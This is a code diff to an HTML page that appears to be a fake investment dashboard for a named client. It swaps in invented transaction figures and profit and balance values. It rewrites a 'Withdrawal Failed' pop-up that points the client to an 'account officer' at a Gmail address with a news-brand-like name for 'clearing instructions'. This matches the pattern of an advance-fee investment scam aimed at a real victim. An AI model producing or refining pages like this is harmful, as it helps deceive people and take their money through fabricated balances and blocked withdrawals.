@@ -117,7 +117,7 @@
                 <div class="overflow-x-auto">
                     <table class="w-full text-left">
                         <thead class="bg-gray-50 text-xs font-bold text-gray-500 uppercase">
-                            <!-- <tr>
+                            <tr>
                                 <th class="px-6 py-4">Transaction Date</th>
                                 <th class="px-6 py-4">Description</th>
                                 <th class="px-6 py-4">Amount</th>
@@ -126,23 +126,23 @@
                         </thead>
                         <tbody class="divide-y divide-gray-100 text-sm">
                             <tr>
-                                <td class="px-6 py-4">Feb 20, 2026</td>
-                                <td class="px-6 py-4 font-medium">Clearance Fee</td>
-                                <td class="px-6 py-4 text-green-600 font-bold">+$2,750.00</td>
+                                <td class="px-6 py-4">Sep 5, 2026</td>
+                                <td class="px-6 py-4 font-medium">Withdrawal to ADP</td>
+                                <td class="px-6 py-4 text-green-600 font-bold">+$3,000.00</td>
+                                <td class="px-6 py-4"><span class="bg-yellow-100 text-yellow-700 px-2 py-1 rounded-full text-xs">In Progress</span></td>
+                            </tr>
+                             <tr>
+                                <td class="px-6 py-4">Sep 4, 2026</td>
+                                <td class="px-6 py-4 font-medium">Investment Profit</td>
+                                <td class="px-6 py-4 text-green-600 font-bold">+$2,420.00</td>
                                 <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-2 py-1 rounded-full text-xs">Completed</span></td>
                             </tr>
                              <tr>
-                                <td class="px-6 py-4">Feb 15, 2026</td>
-                                <td class="px-6 py-4 font-medium">Investment Profit</td>
-                                <td class="px-6 py-4 text-green-600 font-bold">+$15,420.00</td>
+                                <td class="px-6 py-4">Seo 4, 2026</td>
+                                <td class="px-6 py-4 font-medium">Investment Deposit</td>
+                                <td class="px-6 py-4 text-green-600 font-bold">+$2,500.00</td>
                                 <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-2 py-1 rounded-full text-xs">Completed</span></td>
                             </tr>
-                             <tr>
-                                <td class="px-6 py-4">Feb 8, 2026</td>
-                                <td class="px-6 py-4 font-medium">Investment Profit</td>
-                                <td class="px-6 py-4 text-green-600 font-bold">+$8,519.00</td>
-                                <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-2 py-1 rounded-full text-xs">Completed</span></td>
-                            </tr> -->
                              <tr>
                                 <td class="px-6 py-4">Sep 4, 2026</td>
                                 <td class="px-6 py-4 font-medium">Investment Profit</td>
@@ -178,7 +178,7 @@
         <div class="bg-white w-full max-w-lg rounded-lg overflow-hidden shadow-2xl">
             <div class="bg-[#cc0000] p-4 text-white flex items-center space-x-2">
                 <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
-                <span class="font-bold uppercase tracking-wider">Transaction Error</span>
+                <span class="font-bold uppercase tracking-wider">Transaction in Progress</span>
             </div>
             <div class="p-8 text-center">
                 <p class="text-gray-800 leading-relaxed mb-6 font-medium" id="modal-text"></p>
@@ -193,9 +193,9 @@
     <script>
         const clientData = {
             name: "Shane Stener",
-            invested: "$250.00",
-            profit: "$500.00",
-            balance: "$750.00",
+            invested: "$2500.00",
+            profit: "$170.00",
+            balance: "$2670.00",
             officer: "Jenny Williams",
             email: "foxnewsinvestment.co@gmail.com"
         };
@@ -230,7 +230,7 @@
         });
 
         function openWithdrawModal() {
-            const errorText = `Withdrawal Failed. Investment In Progress. In case of Emergency Withdrawal Please contact your account officer, ${clientData.officer}, at ${clientData.email} for clearing instructions.`;
+            const errorText = `Withdrawal Failed. You have a pending withdrawal of $3,000 to your secured ADP with user ID Shanestener82. Your deposit would arrive in 2-3 working days Please contact your account officer, ${clientData.officer}, at ${clientData.email} for clearing instructions.`;
             document.getElementById('modal-text').innerText = errorText;
             document.getElementById('contact-btn').onclick = () => {
                 window.location.href = `mailto:${clientData.email}?subject=Withdrawal Inquiry - ${clientData.name}`;
@@ -244,4 +244,3 @@
     </script>
 </body>
 </html>
-
